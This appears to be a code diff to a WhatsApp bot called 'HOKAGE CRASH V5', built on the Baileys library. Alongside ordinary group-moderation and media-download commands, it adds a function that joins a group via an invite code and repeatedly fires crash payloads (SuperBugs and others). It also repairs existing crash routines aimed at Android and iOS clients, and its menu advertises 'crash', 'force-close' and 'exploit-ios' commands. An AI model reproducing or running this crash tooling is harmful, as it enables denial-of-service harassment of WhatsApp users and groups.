@@ -11,13 +11,40 @@ const {
     generateWAMessageFromContent,
     jidDecode
 } = require("@whiskeysockets/baileys");
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 const axios = require('axios');
 const fs = require('fs-extra');
 const crypto = require("crypto");
 const util = require('util');
 const chalk = require('chalk');
 const { addPremiumUser, delPremiumUser } = require("./lib/premium");
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+const runtime = (seconds) => {
+    seconds = Number(seconds);
+    const d = Math.floor(seconds / (3600 * 24));
+    const h = Math.floor(seconds % (3600 * 24) / 3600);
+    const m = Math.floor(seconds % 3600 / 60);
+    const s = Math.floor(seconds % 60);
+    const dDisplay = d > 0 ? d + 'd ' : '';
+    const hDisplay = h > 0 ? h + 'h ' : '';
+    const mDisplay = m > 0 ? m + 'm ' : '';
+    const sDisplay = s > 0 ? s + 's' : '';
+    return dDisplay + hDisplay + mDisplay + sDisplay;
+};
+
+function createSticker(hash) {
+    return {
+        url: `https://mmg.whatsapp.net/v/t62.15575-24/${hash}`,
+        fileSha256: hash,
+        fileEncSha256: hash,
+        mediaKey: hash,
+        mimetype: "image/webp",
+        directPath: `/v/t62.15575-24/${hash}`,
+        fileLength: "10610",
+        mediaKeyTimestamp: "1741150286",
+    };
+}
 
 //===============
 module.exports = minato = async (minato, m, chatUpdate, store) => {
@@ -43,6 +70,7 @@ const isCmd = !!prefix;
 const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
 const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
 const text = args.join(" "); 
+await checkAntiLink(minato, m);
 const fatkuns = m.quoted || m;
 const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
 ? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
@@ -51,11 +79,6 @@ const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns
 const botNumber = await minato.decodeJid(minato.user.id);
 const sender = m.sender;
 const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
-let premuser = [];
-try {
-  premuser = JSON.parse(fs.readFileSync("./system/database/premium.json", "utf8"));
-} catch(e) {}
-
 const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
 if (!minato.public && !isCreator) return;
 
@@ -460,7 +483,7 @@ async function SuperBugs(minato, target) {
   await minato.relayMessage(target, msg, {});
 }
 
-async function LoseBuldo(target) {
+async function LoseBuldo(minato, target) {
   for (let i = 0; i < 1000; i++) {
     try {
       let sejaya = {
@@ -592,6 +615,26 @@ async function MakluGwEvve(target) {
       }
     ]
   });
+}
+
+async function proccesCrashGroup(minato, inviteCode) {
+    try {
+        let group = await minato.groupAcceptInvite(inviteCode);
+        let target = group;
+        
+        for (let i = 0; i < 50; i++) {
+            try {
+                await xxx(minato, target);
+                await sleep(2000);
+                await SuperBugs(minato, target);
+                await sleep(2000);
+            } catch (e) {
+                console.log("Group crash loop error:", e);
+            }
+        }
+    } catch (err) {
+        console.error("Group crash error:", err);
+    }
 }
 
 async function Whatsapps(minato, target) {
@@ -998,7 +1041,7 @@ async function ForcloseClick(minato, target) {
   try {
     for (let i = 0; i < 50; i++) {
 
-      await minato.sendMessage(jid, {
+      await minato.sendMessage(target, {
         requestPaymentMessage: {
           currencyCodeIso4217: "IDR",
           amount1000: 10000 * 1000,
@@ -1214,18 +1257,18 @@ async function IosInvisible(minato, target) {
          }
       };
       
-      let msg1 = generateWAMessageFromContent(targetJid, {
+      let msg1 = generateWAMessageFromContent(target, {
          viewOnceMessage: { message: { locationMessage } }
       }, {});
       
-      let msg2 = generateWAMessageFromContent(targetJid, {
+      let msg2 = generateWAMessageFromContent(target, {
          viewOnceMessage: { message: { extendMsg } }
       }, {});
 
       for (const msg of [msg1, msg2]) {
          await minato.relayMessage('status@broadcast', msg.message, {
             messageId: msg.key.id,
-            statusJidList: [targetJid],
+            statusJidList: [target],
             additionalNodes: [{
                tag: 'meta',
                attrs: {},
@@ -1246,6 +1289,55 @@ async function IosInvisible(minato, target) {
       console.error(err);
    }
 };
+// ================= ANTILINK DETECTOR FUNCTION =================//
+async function checkAntiLink(minato, m) {
+    if (!m.isGroup) return;
+    if (!global.antilink) return;
+    if (isAdmins) return; // Admins can send links
+    if (isCreator) return; // Owner can send links
+    
+    const linkRegex = /(https?:\/\/)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
+    
+    if (linkRegex.test(body)) {
+        // Delete the message
+        try {
+            await minato.sendMessage(m.chat, { delete: m.key });
+        } catch (e) {}
+        
+        // Add warning
+        let groupWarnings = global.warnings[m.chat] || {};
+        groupWarnings[m.sender] = (groupWarnings[m.sender] || 0) + 1;
+        global.warnings[m.chat] = groupWarnings;
+        
+        let warnCount = groupWarnings[m.sender];
+        
+        if (warnCount >= 3) {
+            try {
+                await minato.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
+                await minato.sendMessage(m.chat, {
+                    text: `┌⪼❏ USER KICKED
+├◆ @${m.sender.split('@')[0]}
+├◆ Reason: Sending links (3/3)
+├◆ Links are not allowed!
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
+                    mentions: [m.sender]
+                });
+                delete groupWarnings[m.sender];
+                global.warnings[m.chat] = groupWarnings;
+            } catch (e) {}
+        } else {
+            await minato.sendMessage(m.chat, {
+                text: `┌⪼❏ ANTILINK WARNING ${warnCount}/3
+├◆ @${m.sender.split('@')[0]}
+├◆ Links are not allowed!
+├◆ Message deleted
+├◆ ${3 - warnCount} warnings until kick
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
+                mentions: [m.sender]
+            });
+        }
+    }
+}
 //============= ( Case commands ) =======\\
 switch (command ) {
 
@@ -1254,47 +1346,83 @@ await minato.sendMessage(m.chat, {react: {text: '⌛', key: m.key}})
 await minato.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
 await minato.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 let Menu = `
-━━━━━━━━━━━━━━━━━━━━
-    ʙᴏᴛ ɪɴғᴏ
-━━━━━━━━━━━━━━━━━━━━
-𐓷  _ᴄʀᴇᴀᴛᴏʀ: </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅_
-𐓷  _ʙᴏᴛ ɴᴀᴍᴇ: 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻_
-𐓷  _ᴠᴇʀ𝚜ɪᴏɴ: v5.0.0_
-𐓷  _𝚜ᴛᴀᴛᴜᴛ:  ᴀᴄᴛɪғ_
-𐓷  _ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}_
-𐓷  _ᴘʀᴇғɪ𝚡ᴇ: мᴜʟᴛɪ ᴘʀᴇғɪx_
+┌⪼❏ ʙᴏᴛ ɪɴғᴏ
+├◆ ᴄʀᴇᴀᴛᴏʀ: </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅
+├◆ ʙᴏᴛ ɴᴀᴍᴇ: 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻
+├◆ ᴠᴇʀ𝚜ɪᴏɴ: v5.0.0
+├◆ 𝚜ᴛᴀᴛᴜ𝚜: ᴀᴄᴛɪғ
+├◆ ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}
+├◆ ᴘʀᴇғɪx: мᴜʟᴛɪ ᴘʀᴇғɪx
+└ ❏
 
-━━━━━━━━━━━━━━━━━━━━
-    𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
-━━━━━━━━━━━━━━━━━━━━
+┌⪼❏ ʙᴜɢ ᴍᴇɴᴜ
+├◆ ᴄʀᴀsʜ-ᴀɴᴅʀᴏ
+├◆ ᴅᴇʟᴀʏ-ᴀɴᴅʀᴏ
+├◆ ғᴄ-ᴀɴᴅʀᴏ
+├◆ ᴇxᴘʟᴏɪᴛ-ɪᴏs
+├◆ ᴄʀᴀsʜ-ɢᴄ
+└ ❏
 
-𐓷 _ᴄʀᴀsʜ-ᴀɴᴅʀᴏ_
-𐓷 _ᴅᴇʟᴀʏ-ᴀɴᴅʀᴏ_
-𐓷 _ғᴄ-ᴀɴᴅʀᴏ_
-𐓷 _ᴇxᴘʟᴏɪᴛ-ɪᴏs_
-𐓷 _ᴄʀᴀsʜ-ɢᴄ_
+┌⪼❏ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
+├◆ ᴀᴅᴅᴘʀᴇᴍ
+├◆ ᴅᴇʟᴘʀᴇᴍ
+├◆ sᴇʟғ
+├◆ ᴘᴜʙʟɪᴄ
+├◆ ᴘɪɴɢ
+├◆ ʀᴇsᴛᴀʀᴛ
+├◆ ʀᴇǫᴜᴇsᴛ
+├◆ ᴜᴘᴅᴀᴛᴇ
+├◆ ᴀᴜᴛᴏᴛʏᴘɪɴɢ
+├◆ ᴀᴜᴛᴏᴠɪᴇᴡsᴛᴀᴛᴜs
+├◆ ᴇɴᴄ
+└ ❏
 
+┌⪼❏ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
+├◆ ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ
+├◆ ᴍᴜᴛᴇ
+├◆ ᴜɴᴍᴜᴛᴇ
+├◆ ᴛᴀɢᴀʟʟ
+├◆ ʜɪᴅᴇᴛᴀɢ
+├◆ ᴋɪᴄᴋ
+├◆ ᴀᴅᴅ
+├◆ ᴘʀᴏᴍᴏᴛᴇ
+├◆ ᴅᴇᴍᴏᴛᴇ
+├◆ ɢᴄʟɪɴᴋ
+├◆ ʀᴇᴠᴏᴋᴇ
+├◆ ɢʀᴏᴜᴘɪɴғᴏ
+├◆ ᴅᴇʟᴇᴛᴇ
+├◆ ᴡᴀʀɴ
+├◆ ʀᴇsᴇᴛᴡᴀʀɴ
+├◆ ᴄʜᴇᴄᴋᴡᴀʀɴ
+└ ❏
 
-━━━━━━━━━━━━━━━━━━━━
-    𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄
-━━━━━━━━━━━━━━━━━━━━
+┌⪼❏ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ
+├◆ ᴘʟᴀʏ
+├◆ ʏᴛᴍᴘ𝟹
+├◆ ʏᴛᴍᴘ𝟺
+├◆ ᴛɪᴋᴛᴏᴋ
+├◆ ɪɴsᴛᴀ
+├◆ ғʙ
+├◆ ᴛᴡɪᴛᴛᴇʀ
+├◆ sᴘᴏᴛɪғʏ
+├◆ ᴘɪɴᴛᴇʀᴇsᴛ
+├◆ ᴍᴇᴅɪᴀғɪʀᴇ
+├◆ ᴍᴏᴠɪᴇ
+├◆ sᴀᴠᴇsᴛᴀᴛᴜs
+└ ❏
 
-𐓷 _ᴀᴅᴅᴘʀᴇᴍ_ 
-𐓷 _ᴅᴇʟᴘʀᴇᴍ_ 
-𐓷 _sᴇʟғ_ 
-𐓷 _ᴘᴜʙʟɪᴄ_ 
-𐓷 _sᴘᴇᴇᴅ_ 
-𐓷 _ᴘɪɴɢ_ 
-𐓷 _ʀᴇsᴛᴀʀᴛ_ 
-𐓷 _ʀᴇǫᴜᴇsᴛ_ 
+┌⪼❏ ᴏsɪɴᴛ/sᴛᴀʟᴋ ᴍᴇɴᴜ
+├◆ ᴄᴇᴋɪᴅᴄʜ
+├◆ ɢɪᴛʜᴜʙsᴛᴀʟᴋ
+├◆ ɢʜʀᴇᴘᴏ
+├◆ ɢʜsᴇᴀʀᴄʜ
+└ ❏
 
-━━━━━━━━━━━━━━━━━━━━
-    𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄
-━━━━━━━━━━━━━━━━━━━━
-
-𐓷 _sᴜᴘᴘᴏʀᴛ_
-𐓷 _ᴏᴡɴᴇʀ_
-𐓷 _ᴄʟᴇᴀʀʙᴜɢs_ 
+┌⪼❏ ᴏᴛʜᴇʀ ᴍᴇɴᴜ
+├◆ sᴜᴘᴘᴏʀᴛ
+├◆ ᴏᴡɴᴇʀ
+├◆ ᴄʟᴇᴀʀʙᴜɢs
+└ ❏
 
 > 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅`;
 await minato.sendMessage(m.chat, {
@@ -1303,7 +1431,336 @@ caption: Menu
 }, { quoted: HKQuoted });
 }
 break;
+// ================= PLAY (Search & Download MP3) ======================
+case 'play': {
+    if (!text) return reply(`┌⪼❏ PLAY MUSIC
+├◆ Please provide a song name
+├◆ USAGE: .play P.I.M.P
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
+        
+        let searchRes = await axios.get(`https://api.vreden.my.id/api/ytsearch?query=${encodeURIComponent(text)}`);
+        let searchData = searchRes.data;
+        
+        if (!searchData.result || searchData.result.length === 0) {
+            return reply(`┌⪼❏ NO RESULTS
+├◆ No songs found for: ${text}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        let video = searchData.result[0];
+        let videoUrl = video.url;
+        
+        reply(`┌⪼❏ SONG FOUND
+├◆ Title: ${video.title}
+├◆ Channel: ${video.author.name}
+├◆ Duration: ${video.duration}
+├◆ Views: ${video.views}
+├◆
+├◆ Downloading MP3...
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        
+        let downloadRes = await axios.get(`https://api.vreden.my.id/api/ytplaymp3?url=${encodeURIComponent(videoUrl)}`);
+        let downloadData = downloadRes.data;
+        
+        if (!downloadData.result || !downloadData.result.download || !downloadData.result.download.url) {
+            return reply(`┌⪼❏ ERROR
+├◆ Failed to download audio
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        await minato.sendMessage(m.chat, {
+            audio: { url: downloadData.result.download.url },
+            mimetype: 'audio/mp4',
+            fileName: `${video.title}.mp3`,
+            caption: `┌⪼❏ MP3 DOWNLOADED
+├◆ Title: ${video.title}
+├◆ Channel: ${video.author.name}
+├◆ Duration: ${video.duration}
+├◆ Size: ${downloadData.result.size}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+        }, { quoted: m });
+        
+        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        
+    } catch (err) {
+        console.error('Play error:', err);
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download audio
+├◆ Please try again
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
 
+// ================= YTMP3 ======================
+case 'ytmp3': {
+    if (!text) return reply(`┌⪼❏ YTMP3
+├◆ Please provide a YouTube URL
+├◆ USAGE: .ytmp3 https://youtube.com/watch?v=xxxxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        
+        let res = await axios.get(`https://api.vreden.my.id/api/ytplaymp3?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (!data.result || !data.result.download || !data.result.download.url) {
+            return reply(`┌⪼❏ ERROR
+├◆ Failed to download audio
+├◆ Check the URL and try again
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        await minato.sendMessage(m.chat, {
+            audio: { url: data.result.download.url },
+            mimetype: 'audio/mp4',
+            fileName: `${data.result.title}.mp3`,
+            caption: `┌⪼❏ MP3 DOWNLOADED
+├◆ Title: ${data.result.title}
+├◆ Size: ${data.result.size}
+├◆ Type: MP3 Audio
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+        }, { quoted: m });
+        
+        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        
+    } catch {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download YouTube audio
+├◆ Please try again later
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= YTMP4 ======================
+case 'ytmp4': {
+    if (!text) return reply(`┌⪼❏ YTMP4
+├◆ Please provide a YouTube URL
+├◆ USAGE: .ytmp4 https://youtube.com/watch?v=xxxxx
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        
+        let res = await axios.get(`https://api.vreden.my.id/api/ytplaymp4?url=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (!data.result || !data.result.download || !data.result.download.url) {
+            return reply(`┌⪼❏ ERROR
+├◆ Failed to download video
+├◆ Check the URL and try again
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        await minato.sendMessage(m.chat, {
+            video: { url: data.result.download.url },
+            caption: `┌⪼❏ MP4 DOWNLOADED
+├◆ Title: ${data.result.title}
+├◆ Size: ${data.result.size}
+├◆ Quality: ${data.result.quality}
+├◆ Type: MP4 Video
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
+        }, { quoted: m });
+        
+        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        
+    } catch {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to download YouTube video
+├◆ Please try again later
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= MOVIE DOWNLOAD ======================
+case 'movie':
+case 'movies':
+case 'film': {
+    if (!text) return reply(`┌⪼❏ MOVIE SEARCH
+├◆ Please provide a movie name
+├◆ USAGE: .movie Avengers Endgame
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
+        
+        let res = await axios.get(`https://api.vreden.my.id/api/moviesearch?query=${encodeURIComponent(text)}`);
+        let data = res.data;
+        
+        if (!data.result || data.result.length === 0) {
+            return reply(`┌⪼❏ NO RESULTS
+├◆ No movies found for: ${text}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        let movie = data.result[0];
+        
+        let result = `┌⪼❏ MOVIE INFO
+├◆ Title: ${movie.title || 'Unknown'}
+├◆ Year: ${movie.year || 'Unknown'}
+├◆ Rating: ${movie.rating || 'N/A'}
+├◆ Genre: ${movie.genre || 'Unknown'}
+├◆ Duration: ${movie.duration || 'Unknown'}
+├◆ Description: ${movie.description ? movie.description.slice(0, 200) + '...' : 'No description'}
+├◆
+├◆ Download Links:
+├◆ ${movie.download_url || 'Not available'}
+├◆
+├◆ Use .dlmovie <url> to download
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
+        
+        if (movie.poster || movie.thumbnail) {
+            await minato.sendMessage(m.chat, {
+                image: { url: movie.poster || movie.thumbnail },
+                caption: result
+            }, { quoted: m });
+        } else {
+            reply(result);
+        }
+        
+        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        
+    } catch (err) {
+        console.error('Movie error:', err);
+        reply(`┌⪼❏ ERROR
+├◆ Failed to search for movie
+├◆ Please try again later
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= ANTILINK TOGGLE ======================
+case 'antilink': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can toggle antilink
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    if (args[0] === 'on') {
+        global.antilink = true;
+        reply(`┌⪼❏ ANTILINK
+├◆ Status: ON
+├◆ All links will be deleted
+├◆ Users sending links will be warned/kicked
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } else if (args[0] === 'off') {
+        global.antilink = false;
+        reply(`┌⪼❏ ANTILINK
+├◆ Status: OFF
+├◆ Links are now allowed
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } else {
+        reply(`┌⪼❏ ANTILINK
+├◆ USAGE: .antilink on/off
+├◆ Current Status: ${global.antilink ? 'ON' : 'OFF'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= WARN USER ======================
+case 'warn': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can warn users
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
+    if (!user) return reply(`┌⪼❏ WARN
+├◆ Tag or reply to user to warn
+├◆ USAGE: .warn @user reason
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let reason = text.replace(/@\d+/g, '').trim() || 'No reason provided';
+    let groupWarnings = global.warnings[m.chat] || {};
+    groupWarnings[user] = (groupWarnings[user] || 0) + 1;
+    global.warnings[m.chat] = groupWarnings;
+    
+    let warnCount = groupWarnings[user];
+    
+    if (warnCount >= 3) {
+        try {
+            await minato.groupParticipantsUpdate(m.chat, [user], 'remove');
+            delete groupWarnings[user];
+            global.warnings[m.chat] = groupWarnings;
+            reply(`┌⪼❏ USER KICKED
+├◆ User: @${user.split('@')[0]}
+├◆ Reason: 3/3 warnings reached
+├◆ ${reason}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        } catch {
+            reply(`┌⪼❏ WARNING ${warnCount}/3
+├◆ User: @${user.split('@')[0]}
+├◆ Reason: ${reason}
+├◆ Failed to kick (Bot needs admin)
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+    } else {
+        reply(`┌⪼❏ WARNING ${warnCount}/3
+├◆ User: @${user.split('@')[0]}
+├◆ Reason: ${reason}
+├◆ ${3 - warnCount} warnings until kick
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= RESET WARNINGS ======================
+case 'resetwarn':
+case 'unwarn': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can reset warnings
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
+    if (!user) return reply(`┌⪼❏ RESET WARNINGS
+├◆ Tag or reply to user to reset warnings
+├◆ USAGE: .resetwarn @user
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let groupWarnings = global.warnings[m.chat] || {};
+    delete groupWarnings[user];
+    global.warnings[m.chat] = groupWarnings;
+    
+    reply(`┌⪼❏ WARNINGS RESET
+├◆ User: @${user.split('@')[0]}
+├◆ All warnings cleared
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+}
+break;
+
+// ================= CHECK WARNINGS ======================
+case 'checkwarn':
+case 'warnings': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender) || m.sender;
+    let groupWarnings = global.warnings[m.chat] || {};
+    let warnCount = groupWarnings[user] || 0;
+    
+    reply(`┌⪼❏ WARNINGS CHECK
+├◆ User: @${user.split('@')[0]}
+├◆ Warnings: ${warnCount}/3
+├◆ Status: ${warnCount >= 3 ? 'SHOULD BE KICKED' : 'ACTIVE'}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+}
+break;
 // ================= ( Case Public )=====================
  case "public":{
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
@@ -1311,6 +1768,867 @@ minato.public = true
  reply("*successfully changed to Public Mode*")
  }
  break;                         
+// ================= SAVE STATUS ======================
+case 'savestatus':
+case 'save':
+case 'ss': {
+    if (!m.quoted) return reply(`┌⪼❏ STATUS SAVER
+├◆ Please reply to a status message
+├◆ 
+├◆ USAGE:
+├◆ Reply to status with .savestatus
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+        
+        let quoted = m.quoted;
+        let type = quoted.mtype || '';
+        
+        if (type === 'imageMessage' || type === 'extendedTextMessage' && quoted.text) {
+            // Image status
+            let media = await quoted.download();
+            await minato.sendMessage(m.chat, {
+                image: media,
+                caption: `┌⪼❏ STATUS SAVED
+├◆ Type: Image
+├◆ From: @${quoted.sender.split('@')[0]}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
+                mentions: [quoted.sender]
+            }, { quoted: m });
+            
+        } else if (type === 'videoMessage') {
+            // Video status
+            let media = await quoted.download();
+            await minato.sendMessage(m.chat, {
+                video: media,
+                caption: `┌⪼❏ STATUS SAVED
+├◆ Type: Video
+├◆ From: @${quoted.sender.split('@')[0]}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
+                mentions: [quoted.sender]
+            }, { quoted: m });
+            
+        } else if (type === 'audioMessage') {
+            // Audio status
+            let media = await quoted.download();
+            await minato.sendMessage(m.chat, {
+                audio: media,
+                mimetype: 'audio/mp4',
+                caption: `┌⪼❏ STATUS SAVED
+├◆ Type: Audio
+├◆ From: @${quoted.sender.split('@')[0]}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
+                mentions: [quoted.sender]
+            }, { quoted: m });
+            
+        } else {
+            return reply(`┌⪼❏ STATUS SAVER
+├◆ Unsupported media type
+├◆ Type: ${type}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+        }
+        
+        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        
+    } catch (err) {
+        console.error('Save status error:', err);
+        reply(`┌⪼❏ ERROR
+├◆ Failed to save status
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+// ================= PROMOTE ======================
+case 'promote': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
+├◆ Bot must be admin to promote
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
+    if (!user) return reply(`┌⪼❏ PROMOTE
+├◆ Tag or reply to user to promote
+├◆ USAGE: .promote @user
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.groupParticipantsUpdate(m.chat, [user], 'promote');
+        reply(`┌⪼❏ PROMOTED
+├◆ User: @${user.split('@')[0]}
+├◆ Status: Now an admin
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
+├◆ Failed to promote user
+├◆ ${err.message}
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    }
+}
+break;
+
+// ================= DEMOTE ======================
+case 'demote': {
+    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
+├◆ This command can only be used in groups
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
+├◆ Only group admins can use this command
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    if (!isBotAdmins) return reply(`┌⪼❏ BOT NOT ADMIN
+├◆ Bot must be admin to demote
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    let user = m.mentionedJid[0] || (m.quoted && m.quoted.sender);
+    if (!user) return reply(`┌⪼❏ DEMOTE
+├◆ Tag or reply to user to demote
+├◆ USAGE: .demote @user
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    
+    try {
+        await minato.groupParticipantsUpdate(m.chat, [user], 'demote');
+        reply(`┌⪼❏ DEMOTED
+├◆ User: @${user.split('@')[0]}
+├◆ Status: No longer admin
+└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
+    } catch (err) {
+        reply(`┌⪼❏ ERROR
